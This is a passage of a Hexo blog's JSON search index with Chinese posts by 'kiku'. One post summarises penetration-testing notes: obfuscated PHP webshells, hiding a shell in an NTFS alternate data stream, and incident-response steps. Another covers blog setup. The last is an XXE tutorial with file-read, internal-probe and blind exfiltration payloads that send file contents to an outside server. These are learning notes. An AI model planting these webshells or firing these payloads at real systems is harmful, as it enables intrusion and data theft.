&#x3D;&quot;.$POST[&#39;dd&#39;]&quot;;\n?&gt;\n\n5、多方式传参免杀：\n&lt;?php\n\t$COOKIE &#x3D; $_COOKIE;\n\tforeach($COOKIE as $key &#x3D;&gt; $value)&#123;\n\t\tif($key&#x3D;&#x3D;&#39;assert&#39;)&#123;\n\t\t\t$key($_POST[&#39;s&#39;];);\n\t\t&#125;\n\t&#125;\n?&gt;\n\n\n拿到shell之后藏shell的小妙招：ntfs文件流\n\t&lt;?php include(&#39;&#x2F;:123.txt&#39;)?+echo &quot;&lt;?php eval($_REQUEST[&#39;a&#39;])?&gt;&quot; &gt;&gt; &#x2F;:123.txt\n\t此时会生成一个123.txt文件，但是不会显示，再另外创建一个php文件，内容为&lt;?php include(&#39;&#x2F;:123.txt&#39;);?&gt;就可以使用这个shell了\n\t\n\n绕过市面上所有WAF（终极手法）：\n&lt;?php \neval(mysqli_fetch_assoc(mysqli_query(mysqli_connect(&#39;127.0.0.1&#39;,&#39;root&#39;,&#39;root&#39;,&#39;maoshe&#39;),select * from info))[&#39;infor&#39;]);\n\t这里输入的全部都是目标数据库的信息。\n\n十九、应急响应流程分析：准备阶段：\n准备阶段需要做的是主要是明确资产范围，对可能产生安全问题的地方进行加固。\n检测阶段：\n通过日常的监控，手机系统信息日志等手段对可疑的迹象进行分析、判定，如果判定它属于网络安全应急响应时事件则对该事件进行上报。\n抑制阶段;\n分析影响范围，根据预案采取相应手段，限制攻击的范围，设置隔离区，把影响降低到最小（可以使用安全软件把危险文件进行隔离，如果整台电脑完全沦陷，也可以考虑首先断网）。\n根除阶段：\n分析产生安全事件的原因，如果是木马、病毒就需要寻找病毒的传播源并且遏制、如果是入侵行为就可以通过入侵检测的方式捕获并检测数据流，也可以利用一些工具对病毒特征进行分析和定位。\n恢复阶段：\n对受到破坏的系统和信息还原成正常状态，从可信任的备份中恢复还原系统配置数据库等等，并对其进行监控，确保无误后可适当去掉之前的隔离等抑制措施。\n总结阶段：\n对我们上面所发生的安全事件进行总结，对你使用到有效的手段和方法做一个记录，对后面可能遇到的事件做一个实例。\n","slug":"渗透学习总结","date":"2022-10-11T15:04:00.200Z","categories_index":"","tags_index":"渗透测试","author_index":"kiku"},{"id":"c4cba91c1e0b379daa43b604daad3f91","title":"hexo博客搭建","content":"搭建的博客所参考的blog博客搭建 | 月夜烛魂 (gitee.io)\n新建文章：hexo new p 文件名\n\n专科时搭建的博客，当时根目录在U盘，U盘丢了，懒得再复原了，就又重新搭建了一个，但是途中遇到了问题，以下是找到的一些解决办法。\n(1条消息) git@github.com: Permission denied (publickey). fatal: Could not read from remote repository的问题解决_风随心飞飞的博客-CSDN博客\n(1条消息) Git报错：git@github.com: Permission denied (publickey)_syzdev的博客-CSDN博客\n[(1条消息) Git] hexo d时出现连接超时或者SSL错误的解决方法_richardxp888的博客-CSDN博客\n(1条消息) Failed to connect to github.com port 443: Connection refused问题解决_YIMForever的博客-CSDN博客\n更换了电脑之后，有备份博客文件的，参考这个文章：\n(1条消息) 换电脑后怎么迁移hexo博客？_LolitaAnn的博客-CSDN博客_hexo博客迁移\n这次搭建的是参考的下面这个：\n(1条消息) 超详细Hexo博客搭建教程_NoobStudio的博客-CSDN博客_hexo博客搭建\n这次使用的主题是Aurora：下面是官方文档：\n\n\n\n\n\n\nTIP\n介绍 | Hexo Aurora (tridiamond.tech)\n\n","slug":"搭建博客","date":"2022-10-11T15:04:00.196Z","categories_index":"","tags_index":"","author_index":"kiku"},{"id":"95bc868529d0f6b6803edcb16b8de2ee","title":"XXE总结","content":"XXEXXE基础XXE漏洞全称XML External Entity Injection，即xml外部实体注入了漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。\nXML基础XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。\nXML与HTML的主要区别：\nXML被设计为传输和存储数据，其焦点是数据的内容。\nHTML被设计为用来显示数据，其焦点是数据的外观。\nHTML旨在显示信息，而XML旨在传输信息。\n\nDTD文档类型定义（DTD）可定义合法的XML文档构造模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行的声明于XML文档中，也可作为一个外部引用。\n内部的DOCTYPE声明例如DTD被包含在您的XML原文件中，它应当通过下面的语法包装在一个DOCTYPE声明中：\n&lt;!DOCTYPE 根元素 [元素声明]&gt;\n\n外部文档声明例如DTD位于XML源文件的外部，那么它应通过下面的语法被封装在一个DOCTYPE定义中：\n&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;\n\nDTD的作用：\n通过DTD，你的每一个XML文件均可携带一个有关其自身格式的描述。\n通过DTD，独立的团体可一致地使用某个标准的DTD来交换数据。\n你的应用程序也可使用某个标准的DTD来验证从外部接收到的数据。\n你还可以使用DTD来验证你自身的数据。\n\n实体实体可以理解为变量，其必须在DTD定义申明，可以在文档中的其他位置引起该变量的值。\n实体类别：主要有四类：\n\n内置实体（Built-in entities）\n字符实体（Character entities）\n通用实体（General entities）\n参数实体（Parameter entities）\n\n实体根据引用方式，还可分为内部实体与外部实体，看看这些实体的申明方式。\n参数实体用%实体名称申明，引用时也用%实体名称；其余实体直接用实体名称申明，引用时用&amp;实体名称。\n参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在Xml文档中引用。\n内部实体：\n&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;\n\n外部实体：\n&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;\n\n参数实体：\n&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;或者&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;\n\n外部实体外部实体即在DTD中使用\n&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;\n\n语法引用外部的实体，而非内部实体，那么URL中能写那些类型的外部实体呢？\n主要的有file、http、https、ftp等等。当然不同的程序支持的不一样：\nlibxml2：file、http、ftp\n\nPHP：file、http、ftp、php、compress.zlib、compress.bzip2、data、glob、phar\n\nJava：http、https、ftp、file、jar、netdoc、mailto、gopher *\n\n.NET：file、http、https、ftp\n\nXXE的检测漏洞的发现可以采用扫描工具有专门的xxe扫描工具，也有综合的工具，还可以通过bp中抓取的数据包信息查询关键字，Content-Type值判断有没有等于text/xml或application/xml的，如果没有也可以手工修改为这两个值，将数据更改为xxe语句，看回显，因为数据包中虽然没有写接受信息类型，但是不说明不存在。\nxxe安全漏洞自动化注射脚本工具XXEinjiector——使用ruby编写，需要安装环境，原理就是payload的fuzz（模糊检测）。\n详细介绍：\nhttps:&#x2F;&#x2F;www.cnblogs.com&#x2F;bmjoker&#x2F;p&#x2F;9614990.html\n\n白盒\n函数及可控变量查找\n传输和存储数据格式类型\n\n黑盒\n人工\n\n\n数据格式判断\n\n&lt;user&gt;test&lt;&#x2F;user&lt;pass&gt;Mikasa&lt;&#x2F;pass&gt;\n\n\nContent-Type值判断\n\ntext&#x2F;xml\napplication&#x2F;xml\n\n\n更改Content-Type值看返回\n\n就是通过修改成这两个\ntext&#x2F;xml\napplication&#x2F;xml\n\n\n工具\n\n利用输出形式\n有回显\n\n\n协议玩法\n\nhttp\nfile\n各脚本支持协议，就是上面列出来的编写外部实体的协议\n\n\n外部引用\n\n# 玩法-读文件\n&lt;?xml version &#x3D;&quot;1.0&quot;?&gt;\n&lt;!DOCTYPE ANY [\n&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;d:&#x2F;&#x2F;test.txt&quot;&gt;\n]&gt;\n&lt;x&gt;&amp;xxe;&lt;&#x2F;x&gt;\n\n# 玩法-内网探针或攻击内网应用（触发漏洞地址）不常见\n&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;\n&lt;!DOCTYPE foo [\n&lt;!ELEMENT foo ANY&gt;\n&lt;!ENTITY rabbit SYSTEM &quot;http:&#x2F;&#x2F;192.168.1.1:8080&#x2F;index.txt&quot;&gt;\n]&gt;\n&lt;x&gt;&amp;rabbit;&lt;&#x2F;x&gt;\n通过有xxe的漏洞网站，向其服务器内网进行判断192.168.1.1的8080端口是否开放，并且index.txt文件是否存在\n\n引入外部实体dtd——主要的作用是自定义攻击，但是前提条件是对方网站没有禁止引入外部实体\n&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;\n&lt;!DOCTYPE test [\n&lt;!ENTITY %file SYSTEM &quot;http:&#x2F;&#x2F;127.0.1.1:8080&#x2F;evil2.dtd&quot;&gt;#url只想自己公网IP\n%file;\n]&gt;\n&lt;x&gt;&amp;send;&lt;&#x2F;x&gt;\n\ndtd文件会被当做xml文件执行\n所以在自己服务器上写上相应的代码即可 evil2.dtd:&lt;!ENTITY send SYTEM &quot;file:&#x2F;&#x2F;&#x2F;d:&#x2F;test.txt&quot;&gt;\n\n\n无回显\n\n\n外部引用-反向链接配合\n\n# 读取文件\n有时网站代码中设置了不回显，可以通过向自己服务器发送数据来查看到信息，一种是看日志信息，一种是将传递进来的数据直接写入到文件中。\n&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;\n&lt;!DOCTYPE test [\n&lt;!ENTITY %file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;d:&#x2F;test.txt&quot;&gt;\n#用上面这行代码的情况下不写文件的绝对路径也能正常搜寻，只不过是在当前路径下，而在file的话就要写全路径\n&lt;!ENTITY %dtd SYSTEM &quot;http:&#x2F;&#x2F;192.168.0.103:8080&#x2F;test.dtd&quot;&gt;\n%dtd;\n%send;\n]&gt;\n服务器中test.dtd文件代码：\n&lt;!ENTITY %payload\n&quot;&lt;ENTITY &amp;#x25; send SYSTEM\n&#39;http:&#x2F;&#x2F;192.168.0.103:8080&#x2F;?data&#x3D;%file;&#39;&gt;&quot;\n&gt;\n&amp;payload;\n\n过滤绕过\n协议玩法\n\n比如http协议被过滤可以采用其他的协议方法绕过\n\n外部引用\n\n编码UTF-16BE\n\n\n详细可参考：https://www.cnblogs.com/20175211lyz/p/11413335.html\n修复\n禁用外部实体引用\n过滤关键字\nWAF产品\n\n","slug":"XXE总结","date":"2022-10-09T11:42:15.000Z","categories_index":"XXE","tags_index":"XXE","author_index":"kiku"}]